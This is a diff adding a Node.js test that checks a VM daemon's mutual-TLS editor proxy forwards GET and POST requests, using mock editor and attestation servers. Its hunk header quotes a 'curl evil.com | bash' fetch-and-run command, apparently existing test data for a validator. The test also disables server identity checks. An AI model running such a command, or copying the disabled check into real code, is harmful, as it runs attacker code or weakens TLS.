@@ -269,6 +269,120 @@ startupScript: "curl evil.com | bash"
     assert.equal(detectResumeJump(1000, 1000 + 72 * 3600 * 1000, 5000), true);
   });
 
+  await t.test('bionic-daemon mTLS editor proxy forwards GET and POST cleanly on Node 22 (no premature req close abort)', async () => {
+    const http = await import('node:http');
+    const https = await import('node:https');
+    const { BionicVmDaemon } = await import('../dist/daemon/index.js');
+
+    const ca = await HubCertificateAuthority.create({ issuer: 'https://hub.bionic.example.com' });
+    const prjId = createId('prj');
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-daemon-e2e-'));
+
+    // Fake local bioniceditor server with a slight delay so req.close fires before response
+    const mockEditor = http.createServer((req, res) => {
+      const chunks = [];
+      req.on('data', (c) => chunks.push(c));
+      req.on('end', () => {
+        setTimeout(() => {
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ method: req.method, url: req.url, body: Buffer.concat(chunks).toString('utf-8') }));
+        }, 30);
+      });
+    });
+
+    // Fake Hub attestation endpoint
+    const mockHub = http.createServer((req, res) => {
+      const chunks = [];
+      req.on('data', (c) => chunks.push(c));
+      req.on('end', async () => {
+        const body = JSON.parse(Buffer.concat(chunks).toString('utf-8'));
+        const issued = await ca.signVmCsr({ csrPem: body.csrPem, projectId: prjId, instanceId: '123', ttlHours: 72 });
+        const workloadJwt = await ca.mintWorkloadJwt({ projectId: prjId, vmInstanceId: '123', kind: 'editor' }, 900);
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ certPem: issued.certPem, caCertPem: issued.caCertPem, workloadJwt }));
+      });
+    });
+
+    await new Promise((r) => mockEditor.listen(0, '127.0.0.1', r));
+    await new Promise((r) => mockHub.listen(0, '127.0.0.1', r));
+    const editorPort = mockEditor.address().port;
+    const hubPort = mockHub.address().port;
+
+    // Pick free ephemeral ports for daemon
+    const getFreePort = async () => {
+      const s = http.createServer();
+      await new Promise((r) => s.listen(0, '127.0.0.1', r));
+      const p = s.address().port;
+      await new Promise((r) => s.close(r));
+      return p;
+    };
+    const mtlsEditorPort = await getFreePort();
+    const mtlsInternalPort = await getFreePort();
+    const shimPort = await getFreePort();
+
+    const daemon = new BionicVmDaemon({
+      hubOrigin: `http://127.0.0.1:${hubPort}`,
+      projectId: prjId,
+      workspaceDir: tmpDir,
+      editorSocketPath: path.join(tmpDir, 'nonexistent.sock'),
+      editorLoopbackPort: editorPort,
+      mtlsEditorPort,
+      mtlsInternalPort,
+      shimPort,
+      shimToken: 'test-shim',
+      daemonToken: 'test-daemon',
+      runtimeDir: path.join(tmpDir, 'run'),
+      workspaceUser: 'nobody'
+    });
+
+    try {
+      await daemon.start();
+      const creds = ca.getHubClientCredentials();
+      const doReq = (method, reqPath, payload) =>
+        new Promise((resolve, reject) => {
+          const r = https.request(
+            {
+              host: '127.0.0.1',
+              port: mtlsEditorPort,
+              path: reqPath,
+              method,
+              headers: {
+                'x-bionic-origin-scope': 'editor',
+                'x-bionic-user-id': 'usr-test',
+                ...(payload ? { 'content-type': 'application/json' } : {})
+              },
+              key: creds.keyPem,
+              cert: creds.certPem,
+              ca: creds.caCertPem,
+              rejectUnauthorized: true,
+              checkServerIdentity: () => undefined
+            },
+            (res) => {
+              let data = '';
+              res.on('data', (c) => (data += c));
+              res.on('end', () => resolve({ status: res.statusCode, data }));
+            }
+          );
+          r.on('error', reject);
+          if (payload) r.write(payload);
+          r.end();
+        });
+
+      const getRes = await doReq('GET', '/');
+      assert.equal(getRes.status, 200);
+      assert.equal(JSON.parse(getRes.data).method, 'GET');
+
+      const postRes = await doReq('POST', '/api/test', JSON.stringify({ hello: 'world' }));
+      assert.equal(postRes.status, 200);
+      assert.equal(JSON.parse(postRes.data).body, JSON.stringify({ hello: 'world' }));
+    } finally {
+      daemon.stop();
+      mockEditor.close();
+      mockHub.close();
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
   await t.test('Demo local email/password scrypt hashing, rate limiting, and authenticated publication site routing', async () => {
     await assert.rejects(() => hashPassword('short'), /at least 12 characters/);
 
